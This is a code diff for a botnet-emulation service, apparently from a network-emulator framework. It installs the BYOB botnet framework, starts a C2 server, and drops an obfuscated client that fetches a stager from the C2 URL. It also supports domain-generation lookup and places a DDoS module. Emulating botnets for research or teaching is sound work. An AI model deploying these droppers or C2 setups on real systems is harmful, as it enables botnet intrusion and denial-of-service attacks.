@@ -113,12 +113,12 @@ class BotnetServer(Server):
         """
         address = str(node.getInterfaces()[0].getAddress())
 
-        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip')
-        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')
-        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')
-        node.setFile('/tmp/byob/byob/modules/payloads/b6H.py', BotnetServerFileTemplates['payload'].replace("{serverHost}", address))
-        node.setFile('/tmp/byob/byob/modules/stagers/b6H.py', BotnetServerFileTemplates['stager'].replace("{serverHost}", address))
-        node.appendStartCommand('cd /tmp/byob/byob/; echo "exit\ny" | python3 server.py --port {} &'.format(self.__port))
+        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') # Dependencies software
+        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/') #Install Byob framework
+        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt') #Dependencies for Byob python lib.
+        node.setFile('/tmp/byob/byob/modules/payloads/b6H.py', BotnetServerFileTemplates['payload'].replace("{serverHost}", address)) # Copy payload to C2 server without manually generating by ourself.
+        node.setFile('/tmp/byob/byob/modules/stagers/b6H.py', BotnetServerFileTemplates['stager'].replace("{serverHost}", address)) # Copy stager to C2 server without manually generating by ourself.
+        node.appendStartCommand('cd /tmp/byob/byob/; echo "exit\ny" | python3 server.py --port {} &'.format(self.__port)) # Start C2 process in the background .
 
     def print(self, indent: int) -> str:
         out = ' ' * indent
@@ -148,7 +148,7 @@ class BotnetClientServer(Server):
         ## ! todo, not support to change port right now
         self.__port = port
 
-    def setServer(self, c2_server: str, enable_dga = False, dga = None):
+    def setServer(self, c2_server = '127.0.0.1', enable_dga = False, dga = None):
         """!
         @brief BotnetClient constructor.
 
@@ -159,29 +159,41 @@ class BotnetClientServer(Server):
         self.__c2_server_url = 'http://{}:446//stagers/b6H.py'.format(c2_server)
         self.__c2_server_ip = c2_server
 
-        if not enable_dga:
+        if not enable_dga: # Not Enable DGA, using IP to connect to C2 server
             self.__dropper = BotnetServerFileTemplates['dropper']\
                         .format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()"
                                                                       .format(repr(self.__c2_server_url)),2)))))
         else:
-            if dga is None:
+            if dga is None: # Enable DGA, using default dga function
                 dga_source_code = DGA_DEFAULT_FUNCTION
-            else:
+            else: # Enable DGA, using user provided dga function
                 dga_source_code = inspect.getsource(dga)
             self.__dropper = BotnetServerFileTemplates['dga_dropper'].format(dga = dga_source_code)
+
+    def setModule(self, filename: str, file_src:str):
+        """!
+        @brief pass file to bot client into folder /tmp/.
+        @param filename the file name will be in tmp folder.
+        @param file_dst file path.
+        """
+        self.__module = []
+        file_content = open(file_src, 'r').read()
+        self.__module.append({"filename": filename, "file_content": file_content})
 
     def install(self, node: Node):
         """!
         @brief Install the service.
         """
-        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip')
-        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')
-        # self.__node.addBuildCommand('curl https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py')
-        # self.__node.addBuildCommand('python2 /tmp/get-pip.py')
-        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt')
-        node.addBuildCommand('pip3 install scapy')
-        node.setFile('/tmp/BotClient.py', self.__dropper)
+        if len(self.__module) > 0: #if have modules, add them in bot client
+            for m in self.__module:
+                node.setFile('/tmp/'+ m.get('filename'), m.get('file_content'))
+        node.addSoftware('python3 git cmake python3-dev gcc g++ make python3-pip') # Dependencies software
+        node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/') #Install Byob framework
+        node.addBuildCommand('pip3 install -r /tmp/byob/byob/requirements.txt') # Dependencies for Byob
+        node.addBuildCommand('pip3 install scapy') # Dependencies for simple DDoS module
+        node.setFile('/tmp/BotClient.py', self.__dropper) # Add Bot client payload
         node.setFile('/tmp/ddos.py', BotnetServerFileTemplates['ddos_module'])
+        # start_command used for making sure the C2 server can be connected after network configuration ready.
         node.appendStartCommand(BotnetServerFileTemplates['start_command'].format(C2ServerIp = self.__c2_server_ip))
 
     def print(self, indent: int) -> str:
